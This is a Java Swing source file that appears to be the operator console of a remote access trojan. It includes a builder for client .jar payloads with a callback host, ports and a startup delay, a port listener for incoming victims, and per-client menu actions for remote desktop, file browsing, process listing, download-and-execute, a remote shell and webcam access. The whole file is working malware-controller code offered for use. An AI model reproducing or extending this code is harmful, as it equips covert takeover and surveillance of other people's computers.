package rat.master.gui.frames;

import net.miginfocom.swing.MigLayout;
import rat.master.ClientController;
import rat.master.MasterMain;
import rat.master.gui.models.ClientTableModel;
import rat.utils.ClientBuild;
import rat.utils.ClientJarBuilder;
import rat.utils.Util;

import javax.swing.*;
import javax.swing.border.LineBorder;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.text.NumberFormatter;
import java.awt.*;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.text.NumberFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class MainRATWindow extends JFrame {

    private List<MainWindowObserver> observerList = new ArrayList<>();
    private JTable clientTable;
    private ClientTableModel clientTableModel;
    private JPopupMenu popupMenu;
    private JTabbedPane centralTabbedPane;

    private JFormattedTextField txtIPDNS, txtBuildConnectionPort, txtBuildTransferPort, txtFilename;
    private JCheckBox cbJarInstall, cbAddToStartup;
    private ButtonGroup buttonDelayGroup;

    private JFormattedTextField txtConnectionPort, txtTransferPort;
    private JButton btnActivate, btnDeactivate;

    public MainRATWindow() {
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        setMinimumSize(new Dimension(400, 350));
        setLocationRelativeTo(null);
        setVisible(true);
        initGUI();
    }

    private void initGUI() {
        JPanel mainPanel = new JPanel(new BorderLayout());
        setContentPane(mainPanel);

        clientTableModel = new ClientTableModel();
        clientTable = new JTable(clientTableModel);
        clientTable.setShowHorizontalLines(true);
        clientTable.setShowVerticalLines(true);
        clientTable.setDefaultRenderer(Object.class, new JTableRenderer());

        initPopupMenu();

        centralTabbedPane = new JTabbedPane();

        /* Create main panel */
        mainPanel.add(centralTabbedPane, BorderLayout.CENTER);
        centralTabbedPane.add("Main", new JScrollPane(clientTable));

        /* Create build panel */
        initBuildPanel();

        /* Create settings panel */
        initSettingsPanel();
    }

    private void initBuildPanel() {
        JPanel buildPanel = new JPanel(new MigLayout());
        centralTabbedPane.add("Build", buildPanel);

        NumberFormatter portFormatter = new NumberFormatter(NumberFormat.getInstance());
        portFormatter.setValueClass(Integer.class);
        portFormatter.setMinimum(0);
        portFormatter.setMaximum(65535);
        portFormatter.setAllowsInvalid(true);

        JLabel lblIPDNS = new JLabel("IP / DNS");
        buildPanel.add(lblIPDNS);
        txtIPDNS = new JFormattedTextField("127.0.0.1");
        txtIPDNS.setBorder(new LineBorder(Color.BLACK));
        buildPanel.add(txtIPDNS, "wrap, spanx 2, width 150:150:150");

        JLabel lblConnectionPort = new JLabel("Connection port");
        buildPanel.add(lblConnectionPort);
        txtBuildConnectionPort = new JFormattedTextField(portFormatter);
        txtBuildConnectionPort.setBorder(new LineBorder(Color.BLACK));
        txtBuildConnectionPort.setValue(Integer.valueOf(8007));
        buildPanel.add(txtBuildConnectionPort, "wrap, spanx 2, width 100:100:100");

        JLabel lblTransferPort = new JLabel("Transfer port");
        buildPanel.add(lblTransferPort);
        txtBuildTransferPort = new JFormattedTextField(portFormatter);
        txtBuildTransferPort.setBorder(new LineBorder(Color.BLACK));
        txtBuildTransferPort.setValue(Integer.valueOf(4444));
        buildPanel.add(txtBuildTransferPort, "wrap, spanx 2, width 100:100:100");

        JLabel lblFilename = new JLabel("Filename");
        buildPanel.add(lblFilename);
        txtFilename = new JFormattedTextField(String.class);
        txtFilename.setValue(String.valueOf("filename"));
        txtFilename.setBorder(new LineBorder(Color.black));
        buildPanel.add(txtFilename, "width 100:100:100");
        JLabel lblFileExtension = new JLabel(".jar");
        buildPanel.add(lblFileExtension, "wrap");

        JLabel lblDelay = new JLabel("Startup delay");
        buildPanel.add(lblDelay);
        buttonDelayGroup = new ButtonGroup();

        JRadioButton delayOptionNo = new JRadioButton("No delay");
        delayOptionNo.setActionCommand(String.valueOf(0));
        buttonDelayGroup.add(delayOptionNo);
        buildPanel.add(delayOptionNo);
        delayOptionNo.setSelected(true);

        JRadioButton delayOption10s = new JRadioButton("10 seconds");
        delayOption10s.setActionCommand(String.valueOf(10));
        buttonDelayGroup.add(delayOption10s);
        buildPanel.add(delayOption10s, "gap 0px 0px, wrap");

        JRadioButton delayOption1m = new JRadioButton("1 minute");
        delayOption1m.setActionCommand(String.valueOf(60));
        buttonDelayGroup.add(delayOption1m);
        buildPanel.add(delayOption1m, "cell 1 5");

        JRadioButton delayOption5m = new JRadioButton("5 minutes");
        delayOption5m.setActionCommand(String.valueOf(5 * 60));
        buttonDelayGroup.add(delayOption5m);
        buildPanel.add(delayOption5m, "wrap");

        cbJarInstall = new JCheckBox("Install");
        // buildPanel.add(cbJarInstall); // TODO: implement this

        cbAddToStartup = new JCheckBox("Add to startup");
        // buildPanel.add(cbAddToStartup, "wrap"); // TODO: implement this

        JButton btnBuild = new JButton("Build");
        buildPanel.add(btnBuild, "wrap, spanx 2, growx");
        btnBuild.addActionListener(buildAction);
    }

    private void initSettingsPanel() {
        JPanel buildPanel = new JPanel(new MigLayout());
        centralTabbedPane.add("Settings", buildPanel);

        NumberFormatter portFormatter = new NumberFormatter(NumberFormat.getInstance());
        portFormatter.setValueClass(Integer.class);
        portFormatter.setMinimum(0);
        portFormatter.setMaximum(65535);
        portFormatter.setAllowsInvalid(true);

        buildPanel.add(new JLabel("Connection port:"), "span 1");
        txtConnectionPort = new JFormattedTextField(portFormatter);
        txtConnectionPort.setBorder(new LineBorder(Color.BLACK));
        txtConnectionPort.setValue(8007);
        buildPanel.add(txtConnectionPort, "width 100:100:100, span 2, wrap");

        buildPanel.add(new JLabel("Transfer port:"), "span 1");
        txtTransferPort = new JFormattedTextField(portFormatter);
        txtTransferPort.setBorder(new LineBorder(Color.BLACK));
        txtTransferPort.setValue(4444);
        buildPanel.add(txtTransferPort, "width 100:100:100, span 2, wrap");

        btnActivate = new JButton("Start listening");
        buildPanel.add(btnActivate, "span 1");
        btnActivate.addActionListener(bindPortsAction);

        btnDeactivate = new JButton("Stop listening");
        btnDeactivate.setEnabled(false);
        buildPanel.add(btnDeactivate, "span 1, wrap");
        btnDeactivate.addActionListener(unbindPortsAction);
    }

    private void initPopupMenu() {

        popupMenu = new JPopupMenu();
        popupMenu.addPopupMenuListener(popupMenuListener);

        JMenuItem remoteDesktopOption = new JMenuItem("Remote desktop");
        remoteDesktopOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("startRemoteDesktopListGUI");
            });
        });
        popupMenu.add(remoteDesktopOption);

        JMenuItem openWebsiteOption = new JMenuItem("Open website");
        openWebsiteOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("openWebsiteGUI");
            });
        });
        popupMenu.add(openWebsiteOption);

        JMenuItem fileBrowserOption = new JMenuItem("File browser");
        fileBrowserOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("fileBrowserGUI");
            });
        });
        popupMenu.add(fileBrowserOption);

        JMenuItem processListOption = new JMenuItem("Active process list");
        processListOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("processListGUI");
            });
        });
        popupMenu.add(processListOption);

        JMenuItem startChatOption = new JMenuItem("Start chat");
        startChatOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("startChatGUI");
            });
        });
        popupMenu.add(startChatOption);

        JMenuItem messageBoxOption = new JMenuItem("Message box");
        messageBoxOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("startMessageBoxGUI");
            });
        });
        popupMenu.add(messageBoxOption);

        JMenuItem downloadExecuteOption = new JMenuItem("Download and execute jar");
        downloadExecuteOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("startDownloadExecuteGUI");
            });
        });
        popupMenu.add(downloadExecuteOption);

        JMenuItem remoteShellOption = new JMenuItem("Remote shell");
        remoteShellOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("startRemoteShellGUI");
            });
        });
        popupMenu.add(remoteShellOption);

        JMenuItem remoteWebcamOption = new JMenuItem("Remote webcam");
        remoteWebcamOption.addActionListener((e) -> {
            MasterMain.getExecutor().execute(() -> {
                notifySelectedClient("startWebcamListGUI");
            });
        });
        popupMenu.add(remoteWebcamOption);

        clientTable.setComponentPopupMenu(popupMenu);
    }

    private ClientBuild getBuildData() {
        String hostName = txtIPDNS.getText();
        String fileName = txtFilename.getText();
        int connectionPort = (Integer) txtBuildConnectionPort.getValue();
        int transferPort = (Integer) txtTransferPort.getValue();
        int delay = Integer.parseInt(buttonDelayGroup.getSelection().getActionCommand());
        boolean installJar = cbJarInstall.isSelected();
        boolean addToStartup = cbAddToStartup.isSelected();
        return new ClientBuild(hostName, fileName, connectionPort, transferPort, delay, installJar, addToStartup);
    }

    private ActionListener bindPortsAction = (e) -> {
        int connectionPort = (Integer) txtConnectionPort.getValue();
        int transferPort = (Integer) txtTransferPort.getValue();

        if (connectionPort == transferPort) {
            notifyErrorPane("Ports must be different!");
            return;
        }

        if (!Util.portAvailable(connectionPort)) {
            notifyErrorPane("Connection port not available!");
            return;
        }

        if (!Util.portAvailable(transferPort)) {
            notifyErrorPane("Transfer port not available!");
            return;
        }

        boolean connectionPortBound = notifyPortBind(connectionPort, transferPort);
        if (!connectionPortBound) {
            notifyErrorPane("Failed to bind ports.");
        } else {
            txtConnectionPort.setEnabled(false);
            txtTransferPort.setEnabled(false);
            btnDeactivate.setEnabled(true);
            btnActivate.setEnabled(false);
            notifyInfoPane("Ports successfully binded!");
        }
    };

    private ActionListener unbindPortsAction = (e) -> {
        int connectionPort = (Integer) txtConnectionPort.getValue();
        int transferPort = (Integer) txtTransferPort.getValue();

        notifyPortUnbind(connectionPort, transferPort);

        notifyInfoPane("Ports deactivated!");

        txtConnectionPort.setEnabled(true);
        txtTransferPort.setEnabled(true);
        btnDeactivate.setEnabled(false);
        btnActivate.setEnabled(true);
    };

    private ActionListener buildAction = (e) -> {
        ClientBuild buildInfo = getBuildData();
        try {
            ClientJarBuilder.build(buildInfo);
            JOptionPane.showMessageDialog(this, "Jar successfully created!", "Build", JOptionPane.INFORMATION_MESSAGE);
        } catch (IOException e1) {
            e1.printStackTrace();
            new File(buildInfo.getFileName()).delete();
        }
    };

    private PopupMenuListener popupMenuListener = new PopupMenuListener() {
        @Override
        public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
            SwingUtilities.invokeLater(() -> {
                int rowAtPoint = clientTable.rowAtPoint(SwingUtilities.convertPoint(popupMenu, new Point(0, 0),
                        clientTable));
                if (rowAtPoint > -1) {
                    clientTable.setRowSelectionInterval(rowAtPoint, rowAtPoint);
                }
            });
        }

        @Override
        public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
        }

        @Override
        public void popupMenuCanceled(PopupMenuEvent e) {
        }
    };

    private void notifyErrorPane(String message) {
        JOptionPane.showMessageDialog(this, message, "Error", JOptionPane.ERROR_MESSAGE);
    }

    private void notifyInfoPane(String message) {
        JOptionPane.showMessageDialog(this, message, "Information", JOptionPane.INFORMATION_MESSAGE);
    }

    private boolean notifyPortBind(int connectionPort, int transferPort) {
        List<MainWindowObserver> tmp = new ArrayList<>(observerList);
        for (MainWindowObserver observer : tmp) {
            try {
                observer.bindPortRequest(connectionPort, transferPort);
            } catch (Exception ex) {
                notifyPortUnbind(connectionPort, transferPort);
                return false;
            }
        }
        return true;
    }

    private void notifyPortUnbind(int connectionPort, int transferPort) {
        List<MainWindowObserver> tmp = new ArrayList<>(observerList);
        for (MainWindowObserver observer : tmp) {
            observer.unbindPortRequest(connectionPort, transferPort);
        }
    }

    public void register(MainWindowObserver observer) {
        observerList.add(Objects.requireNonNull(observer));
    }

    public void unregister(MainWindowObserver observer) {
        observerList.remove(observer);
    }

    private void notifySelectedClient(String operation) {
        int selectedIndex = clientTable.getSelectedRow();
        if (selectedIndex < 0) return;

        List<MainWindowObserver> tmp = new ArrayList<>(observerList);
        for (MainWindowObserver observer : tmp) {
            observer.mainWindowRequest(clientTableModel.getClient(selectedIndex), operation);
        }
    }

    public void clientConnected(ClientController clientController) {
        clientTableModel.clientConnected(clientController);
    }

    public void clientDisconnected(ClientController clientController) {
        clientTableModel.clientDisconnected(clientController);
    }

    public static class JTableRenderer extends DefaultTableCellRenderer {

        @Override
        public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean
                hasFocus, int row, int column) {
            super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
            setBorder(noFocusBorder);
            setHorizontalAlignment(SwingConstants.CENTER);
            return this;
        }

    }

}
